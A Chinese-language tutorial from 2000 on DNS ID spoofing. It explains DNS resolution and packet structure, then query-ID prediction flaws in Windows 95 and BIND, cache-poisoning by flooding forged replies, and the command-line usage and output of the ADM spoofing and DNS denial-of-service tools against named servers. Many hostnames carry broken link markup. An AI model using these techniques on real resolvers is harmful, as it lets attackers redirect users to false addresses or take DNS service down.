---
title: "DNS ID Hacking"
date: 2000-06-03T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-60"
---

(quack_at_xfocus.org)

DNS ID Hacking                    


by quack<quack@hack.co.za>

[http://www.xfocus.org  ](http://www.xfocus.org�0�2�0�2/)安全焦点

参考资料:DNS ID Hacking by ADM crew


一、关于DNS ID Hacking的一些描述


你可能会对DNS ID Hacking\spoofing的含义有些迷惑，它与一般直接攻击一样，只

不过利用的是DNS协议上的漏洞，并且可能有较大的普遍性及伤害作用――好象没什

么DNS服务器能够逃过它――甚至WINNT。


1、DNS协议机制简述


首先我们来看看DNS是如何工作的，我将在这里说明这一协议中相对重要的一些部份。

为了更好的叙述，我们先用一个实例来看一看一个DNS请求的信息包是如何在网络里

传送的吧。


1.1 : 客户机(bla.bibi.com)发送一个请求要求解析域名"[www.heike.com"](http://www.heike.com"/)，bla.bibi.com

的DNS是ns.bibi.com这台机器，现在我们看看下图吧：


/---------------------------------\

| 111.1.2.123  =  bla.bibi.com    |

| 111.1.2.222  =  ns.bibi.com     |

| 格式:                           |

| IP_ADDR:PORT->IP_ADDR:PORT      |

| 示例:                           |

| 111.1.2.123:2999->111.1.2.222:53|

\---------------------------------/


这图是我们要分析的情况的示意，应该很清楚了，好，那就看看gethostbyname是如何

工作的：


....

  gethosbyname("[www.heike.com"](http://www.heike.com"/));

....


[bla.bibi.com]                             [ns.bibi.com] 

111.1.2.123:1999 --->[?[www.heike.com]------>](http://www.heike.com]------>) 111.1.2.222:53


这里我们可以看到这个名字请求从bla.bibi.com的1999端口(随机选择)发送到了dns

机器的53端口――DNS的绑定端口。


dns.bibi.com收到这个解析的请求后，就开始了它的工作了……


[ns.bibi.com]                         [ns.internic.net]

111.1.2.222:53 -------->[dns?[www.heike.com]---->](http://www.heike.com]---->) 198.41.0.4:53


它先问ns.internic.net哪台机器是[www.heike.com](http://www.heike.com/)的主名称服务器，如果没查到的话

它就把请求发往.com域的权威服务器。在这里要先问ns.internic.net的原因是，可

能这个域名在它的缓存里存在着――这可以节约时间。


[ns.internic.net]                                      [ns.bibi.com]

198.41.0.4:53 ------>[ns for.com is 144.44.44.4]------> 111.1.2.222:53


这里ns.internic.net就回答了ns.bibi.com，.com的权威DNS的IP在144.44.44.4，我

们叫它ns.for.com吧，然后ns.bibi.com会问ns.for.com关于[www.heike.com](http://www.heike.com/)的地址，

仍然没有找到――于是又请求heike.com的DNS权威服务器的地址。


[ns.bibi.com]                              [ns.for.com]

111.1.2.222:53 ------>[?[www.heike.com]----->](http://www.heike.com]----->) 144.44.44.4:53


ns.for.com的应答。


[ns.for.com]                                              [ns.bibi.com]

144.44.44.4:53 ------>[ns for heike.com is 31.33.7.4]---> 144.44.44.4:53


现在我们知道了管heike.com域的权威服务器的IP地址了，姑且称之为ns.heike.com

吧，我们可以问它[www.hieke.com](http://www.hieke.com/)的IP地址了;)


[ns.bibi.com]                              [ns.heike.com]

111.1.2.222:53 ----->[?[www.heike.com]---->](http://www.heike.com]---->) 31.33.7.4:53


现在我们得到了[www.heike.com](http://www.heike.com/)的IP喽！


[ns.heike.com]                                           [ns.bibi.com]

31.33.7.4:53 ------->[[www.heike.com](http://www.heike.com/) == 31.33.7.44] ----> 111.1.2.222:53


ns.bibi.com把它转发给刚才发送请求的机器bla.bibi.com


[ns.bibi.com]                                             [bla.bibi.com]

111.1.2.222:53 ------->[[www.heike.com](http://www.heike.com/) == 31.33.7.44]----> 111.1.2.123:1999


呵呵，现在bla.bibi.com就晓得[www.heike.com](http://www.heike.com/)的IP地址了 :)


好了，现在我们假想另一种情况吧，我们希望通过机器的IP来得到它的域名，为了做

到这点，我们做的是所谓的"指针查询"。由于DNS树中名字是从底向上写的，所以我们

要做如下的一个转换：


示例:

 

100.20.40.3将被表示为3.40.20.100.in-addr.arpa


这种方式仅用于DNS的IP解析请求。


现在来看看我们通过31.33.7.44([www.heike.com](http://www.heike.com/))的IP来查询它的域名的过程吧，或者

说是通过44.7.33.31.in-addr.arpa来查询它的域名的过程;)


....

   gethostbyaddr("31.33.7.44");

....


[bla.bibi.com]                                          [ns.bibi.com]

111.1.2.123:2600 ----->[?44.7.33.31.in-addr.arpa]-----> 111.1.2.222:53


我们发送请求到ns.bibi.com


[ns.bibi.com]                                          [ns.internic.net]

111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 198.41.0.4:53 


ns.internic.net将会把认证该IP的地址'31.in-addr.arpa'返回给请求者


[ns.internic.net]                                             [ns.bibi.com]

198.41.0.4:53 --> [DNS for 31.in-addr.arpa is 144.44.44.4] -> 111.1.2.222:53


现在ns.bibi.com向144.44.44.4问同样的问题


[ns.bibi.com]                                          [ns.for.com]

111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 144.44.44.4:53


如此循环，其实这种方式与gethostbyname没有什么两样……


我希望你能理解上述的DNS对话，现在我们开始进一步了解DNS报文的格式吧。


1.2 :  DNS报文


这里是DNS报文的大致格式 : 


    +---------------------------+---------------------------+

    |     标识 (最重要的 :)     |          参数             |

    +---------------------------+---------------------------+

    |        问题数             |         回答数            |

    +---------------------------+---------------------------+

    |        管理机构数         |        附加信息数         |

    +---------------------------+---------------------------+

    |                                                       |

    \                                                       \

    \                         问题                          \

    |                                                       |

    +-------------------------------------------------------+

    |                                                       |

    \                                                       \

    \                         回答                          \

    |                                                       |

    +-------------------------------------------------------+

    |                                                       |

    \                                                       \

    \                  附加信息(无关紧要)                   \

    |                                                       |

    +-------------------------------------------------------+


1.3 : DNS报文结构


标识(id)


这是用来鉴证每个DNS报文的印记，由客户端设置，由服务器返回，它可以让客户匹

配请求与响应。后面我们将更详细地提到……


参数(flags)


参数域被分成好几个部份 :


       4 位                      3 位,总是0

       |                         |

       |                         |

[QR | opcode | AA| TC| RD| RA | zero | rcode ]

                                         |

 |           |__|__|__|                  |______ 4 位

 |                    |_ 1 位

 |

1 位


QR     = 如果QR位设为0表示报为是查询，如果1则是响应

opcode = 通常是0，指标准查询，1是反向查询，2是服务器状态查询。

AA     = 如果此位为1，表示服务器对问题部份的回答是权威性的。

TC     = 截断，如果UDP包超过512字节将被截流

RD     = 表示希望递归，如果它设为1的话，表示递归查询。

RA     = 如果设为1，表示递归可用。

Zero   = 如它的名称一样，总是0

rcode  = 就象errno一样，0表示没有错误，3表示名字错误。


DNS查询报文:


下面是DNS报文查询的格式 :


+-----------------------------------------------------------------------+

|                             查询名                                    |

+-----------------------------------------------------------------------+

|       查询类型                 |             查询类                   |

+--------------------------------+--------------------------------------+


一个报文查询的结构是下面这样的


示例:


[www.heike.com](http://www.heike.com/)是[3|w|w|w|5|h|e|i|k|e|3|c|o|m|0] 


对IP地址来说，也是同样的;)


44.33.88.123.in-addr.arpa是:


[2|4|4|2|3|3|2|8|8|3|1|2|3|7|i|n|-|a|d|d|r|4|a|r|p|a|0]


还有一种压缩格式，但我们不需要用到，就略过了。


查询类型:


这里是一些我们最经常用到的查询类型――这些类型大约有20种不同的类型，我可懒

得全部列出来了;)


  名称      值

   A    |   1    | IP地址           (将域名解析为IP)

   PTR  |   12   | 指针             (将IP解析为域名)


DNS响应报文:


响应报文有个共同的格式，我们称之为资源记录――RR


下面是响应报文的格式(RR)


+------------------------------------------------------------------------+

|                                域名                                    |

+------------------------------------------------------------------------+

|          类型                    |              类                     |

+----------------------------------+-------------------------------------+

|                           TTL (生存时间)                               |

+------------------------------------------------------------------------+

|      资源数据长度          |                                           |

|----------------------------+                                           |

|                              资源数据                                  |

+-------------------------------------------------------------------------


域名 :


域名是与下面的资源数据对应的名字，它的格式同前面讲到的查询名一样，比如还是

[www.heike.com](http://www.heike.com/)吧，它的域名是用下面方式表现的:[3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]


类型 :


类型标识了RR类型代码号，它同前面讲到的查询类值一样。


类 :


通常为1，表示因特网数据。


生存时间:


表示客户方将RR放在高速缓存里的时间，RRs的TTL通常为2天。


资源数据长度 :


标识资源数据的大小。


下面我们将用一个简单的例子来帮助大家理解：

这个例子展示了当ns.bibi.com向ns.heike.com询问[www.heike.com](http://www.heike.com/)地址时，这些数据

报文的模样。


ns.bibi.com:53 ---> [?[www.heike.com]](http://www.heike.com]) ----> ns.heike.com:53 (Phear Heike ;)


+---------------------------------+--------------------------------------+

|      标识(ID) = 1999            |      QR = 0 opcode = 0 RD = 1        |

+---------------------------------+--------------------------------------+

|     问题数 = htons(1)           |             回答数 = 0               |

+---------------------------------+--------------------------------------+

|     管理机构数 = 0              |           附加信息数 = 0             |

+---------------------------------+--------------------------------------+

<问题部份>

+------------------------------------------------------------------------+

|                  查询名 = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]              |

+------------------------------------------------------------------------+

|          查询类型 = htons(1)    |           查询类=htons(1)            |

+---------------------------------+--------------------------------------+


上面是查询报文


现在我们来看看ns.heike.com的回答


ns.heike.com:53 -->[IP of [www.heike.com](http://www.heike.com/) is 31.33.7.44] --> ns.bibi.com:53


+---------------------------------+---------------------------------------+

|         标识(ID) = 1999         |    QR=1 opcode=0 RD=1  AA =1  RA=1    |

+---------------------------------+---------------------------------------+

|         问题数 = htons(1)       |           回答数 = htons(1)           |

+---------------------------------+---------------------------------------+

|        管理机构数 = 0           |             附加信息数 = 0            |

+---------------------------------+---------------------------------------+

+-------------------------------------------------------------------------+

|                 查询名 = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                |

+-------------------------------------------------------------------------+

|        查询类型 = htons(1)      |          查询类 = htons(1)            |

+-------------------------------------------------------------------------+

+-------------------------------------------------------------------------+

|               查询名 = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                  |

+-------------------------------------------------------------------------+

|        类型       = htons(1)    |          类   = htons(1)              |

+-------------------------------------------------------------------------+

|                       time to live = 999999                             |

+-------------------------------------------------------------------------+

|       资源数据长度 = htons(4)   |    资源数据=inet_addr("31.33.7.44")   |

+-------------------------------------------------------------------------+


OK，就这么多了;)

 

分析 :


在应答中QR = 1 是因为它是应答;)

AA = 1 因为名称服务器是权威服务器

RA = 1 是因为递归是可用的


好了，我希望你能理解上面所说的一切，下面要进行的攻击里要用到上面的理论的。


二、DNS ID的攻击及欺骗


现在是我们来更详细解释什么是DNS ID攻击及欺骗的时候的，就象我刚才所说的，DNS

守护进程用来承认/验证不同的查询/应答是依靠报文中的标识段(ID)，看看下面的例子：


ns.bibi.com;53 ----->[?[www.heike.com]](http://www.heike.com]) ------> ns.heike.com:53


你只需要用假的ns.heike.com进行欺骗，并且在真正的ns.heike.com返回信息于

ns.bibi.com之前先给出它所查询的ip地址。


ns.bibi.com <------- . . . . . . . . . . .  ns.heike.com 

                   |

                   |<--[IP for [www.heike.com](http://www.heike.com/) is 1.2.3.4]<-- hum.roxor.com 


图示很直观了，就是在ns.heike.com前回答一个伪造信息。但这种方法要实现起来有

一个困难――必须伪造ID!也就是说，如果无法判别这个标识符的话，欺骗将无法进

行。如果在局域网上，这很容易实现，只要装一个sniffer就万事OK了。


如果要在广域网上实现它，你并没有太多的选择，只有下面四种方式：


1.) 随机地测试所有ID的可能存在的值。这种办法比较不实用，除非你希望确切地知

    道该ID究竟是多少，或者有一些有利条件可以使其更容易实现。


2.) 发送更多的DNS查询(200 或者 300) 来提升"碰上"正确ID的机会。


3.) 把DNS服务器给Flood了，这样它没办法提供服务，会出现类似下面的错误信息：


    >> Oct 06 05:18:12 ADM named[1913]: db_free: DB_F_ACTIVE set - ABORT

       at this time named daemon is out of order :)


4.) 你可以利用由SNI (SecureNetworks, Inc.)发现的BIND漏洞――关于泄漏洞ID的，

    后面我们将对其做更进一步讨论。


#####################     Windows ID 漏洞     ###########################


在windows95里有一个严重的ID漏洞，它的ID在默认情况下总是1;)，如果有第二个查询的话，那

就设为2(这种情况只出现于两个查询在同一时间发生)。


########################     BIND 漏洞     ##############################


DNS使用的是随机的ID，但它有一个特点就是它总是在下一个质询中给ID+1……


对于它的这个特性，我们可以很容易地用以下方法来利用：


1. 我们可以sniff一个DNS，截断入境的DNS查询，这里ns.dede.com是我们的目标DNS。


2. 你向NS.victim.com要求解析random.dede.com,于是NS.victim.com会向ns.dede.com要求

   解析random.dede.com。

   

   ns.victim.com ---> [?(rand).dede.com ID = 444] ---> ns.dede.com


3. 现在你知道了来自NS.victim.com的ID号了，在本例中ID是444。


4. 然后你发出你的查询请求――比如[www.microsoft.com](http://www.microsoft.com/)到NS.victim.com

   

   (you) ---> [?[www.microsoft.com]](http://www.microsoft.com]) ---> ns.victim.com


   ns.victim.com --> [?[www.microsoft.com](http://www.microsoft.com/) ID = 446 ] --> ns.microsoft.com

     

5. 用ID号为444的信息包Flood ns.victim.com这台DNS――当然这就是你想完成的破坏了;)


 ns.microsoft.com --> [[www.microsoft.com](http://www.microsoft.com/) = 1.1.1.1 ID = 444] --> ns.victim.com

 ns.microsoft.com --> [[www.microsoft.com](http://www.microsoft.com/) = 1.1.1.1 ID = 445] --> ns.victim.com

 ns.microsoft.com --> [[www.microsoft.com](http://www.microsoft.com/) = 1.1.1.1 ID = 446] --> ns.victim.com

 ns.microsoft.com --> [[www.microsoft.com](http://www.microsoft.com/) = 1.1.1.1 ID = 447] --> ns.victim.com

 ns.microsoft.com --> [[www.microsoft.com](http://www.microsoft.com/) = 1.1.1.1 ID = 448] --> ns.victim.com

 ns.microsoft.com --> [[www.microsoft.com](http://www.microsoft.com/) = 1.1.1.1 ID = 449] --> ns.victim.com


*** ADMsnOOfID这个工具就是干这事的;)


还有另一个办法也是干这个活的，你不需要是DNS的root。

它的机制也是相当简单的，介绍如下：


我们要求ns.victim.com解析*.provnet.fr


(you) ----------[?(random).provnet.fr] -------> ns.victim.com


这时ns.victim.com向ns1.provnet.fr要求解析random.provnet.fr，这很正常，有趣的

事情在后面。


从这时开始，你用伪造的信息(用ns1.provnet.fr的IP)来flood那台叫ns.victim.com的DNS，

ID从100到110。


(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=100] --> ns.victim.com 

(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=101] --> ns.victim.com 

(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=102] --> ns.victim.com 

(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=103] --> ns.victim.com 

......


然后我们可以再询问ns.victim.com那台random.provent.fr的IP。


如果ns.victim.com回复了random.provnet.fr的IP，我们就能够找出当前正确的ID了，否则我

再重复这一过程直到成功――这可能会花费比较长的时间，但它是有效的。


ADMnOg00d做的就是这事;)


三、ADMid工具包介绍


工具包里包含5个小工具(我并没有测试过，不知效果如何)


ADMkillDNS  - 非常简单的DNS欺骗工具

ADMsniffID  - sniff一个局域网并且在NS之前回复DNS查询

ADMsnOOfID  - DNS ID欺骗工具(你必需是一台NS的root)

ADMnOg00d   - DNS ID欺骗工具(不需要是NS的root)

ADNdnsfuckr - 一个简单的对付DNS的DOS工具


1: ADMdnsfuckr


ADMdnsfuckr是一个破坏DNS的工具.


它的使用非常简单 !!! :) 


usage:


ADMdnsfuckr <victim>


ex: ADMdnsfuckr bob.lenet.fr


2: ADMsniffID 


ADMsniffID 是一个hijacker .. 


usage:  


ADMsniffID <device> <spoof IP> <spoof NAME> [type 1 or 12 ] 


type为1表示TYPE是A ， 12则表示TYPE是 PTR


ex:


ADMsniffID eth0 31.3.3.7 [www.i.m.mucho.horny.ya](http://www.i.m.mucho.horny.ya/) 12 ( we  hijack TYPE PTR )


[root@ADM root]#nslookup  1.2.3.4

Server:  localhost

Address:  127.0.0.1


Name:    [www.i.m.mucho.horny.ya](http://www.i.m.mucho.horny.ya/)

Address:  1.2.3.4


3: --= ADMsnOOfID =--


usage:

ADMsnOOfID <device to spoof>  <NS victim> <your domain>  <ip of your dns>

<type (1,12)> <spoof name> <spoof ip> <ns with auth on spoof ip or name>


ex:


ADMsnOOfID ppp0 NS2.MCI.NET janova.org shok.janova.org 12 

           [www.i.m.ereet.ya](http://www.i.m.ereet.ya/) 194.206.23.123  ns2.provnet.fr ..


然后你可以看看结果如何;)


[root@ADM root]#nslookup 194.206.23.123  ns2.mci.net

Server:  ns2.mci.net

Address:  204.70.57.242


Name:    [www.i.m.ereet.ya](http://www.i.m.ereet.ya/)

Address:  194.206.23.123


[root@ADM root]#


我们使用ns2.provnet.fr是因为ns2.provnet.fr对194.206.23.*提供认证。 


要找出谁对194.206.23.*提供认证，你可以： 


[root@ADM root]#host -t NS 23.206.194.in-addr.arpa

23.206.194.in-addr.arpa name server NS2.PROVNET.FR

23.206.194.in-addr.arpa name server BOW.RAIN.FR

23.206.194.in-addr.arpa name server NS1.PROVNET.FR

[root@ADM root]#


要找出对*.provnet.fr进行认证的NS，可以：


[root@ADM root]#host -t NS provnet.fr

provnet.fr name server NS1.provnet.fr

provnet.fr name server BOW.RAIN.fr

provnet.fr name server NS2.provnet.fr

[root@ADM root]#


Note: 这可能会改变!!! 所以你可以在对NS1先欺骗一把再对NS2做同样的事;)确保无误，安全第一:)


这里举另一个例子，spoof type是1的


ADMsnOOfID ppp0 ns.mci.net janova.org shok.janova.org 1 wwwkewlya.provnet.fr

 31.3.3.7 ns1.provnet.fr 


然后……


[root@ADM root]#nslookup wwwkewlya.provnet.fr ns.mci.net

Server:  ns.mci.net

Address:  204.70.128.1


Non-authoritative answer:

Name:    wwwkewlya.provnet.fr

Address:  31.3.3.7


[root@ADM root]# 


Ok 这就是 ADMsnOOfID 的用法了 :)


4: ADMnOg00d 


你不需要对某台DNS的控制权了……


usage:


ADMnoG00D <your ip> <dns trust> <domaine trust> <ip victim> <TYPE> <spoof

name> <spoof ip> <ns.trust.for.the.spoof> [ID]


ex:


ADMnOg00d ppp45.somewhere.net ns1.provnet.fr provnet.fr  taz.cyberstation.fr 12 PheAr.ADM.n0.g00d

194.206.23.144 ns2.provnet.fr 7000


(我从ID 7000开始，因为我确切地知道当前taz.cyberstation.fr的ID)


当找到ID后，真正的spoof就开始了，现在我们看看……


[root@shok root1]#  nslookup 194.206.23.144 taz.cyberstation.fr

Server:  taz.cyberstation.fr

Address:  194.98.136.1


Name:    PheAr.ADM.n0.g00d

Address:  194.206.23.144


再提供一个spoof type 是1 的例子吧 


ADMnOg00d ppp45.somewhere.net ns1.provnet.fr provnet.fr  taz.cyberstation.fr 1

w00c0w.provnet.fr 2.6.0.0 ns1.provnet.fr 7000


一会儿之后……


 nslookup w00c0w.provnet.fr taz.cyberstation.fr

...

Server:  taz.cyberstation.fr

Address:  194.98.136.1


Non-authoritative answer:

Name:    w00c0w.provnet.fr

Address:  2.6.0.0
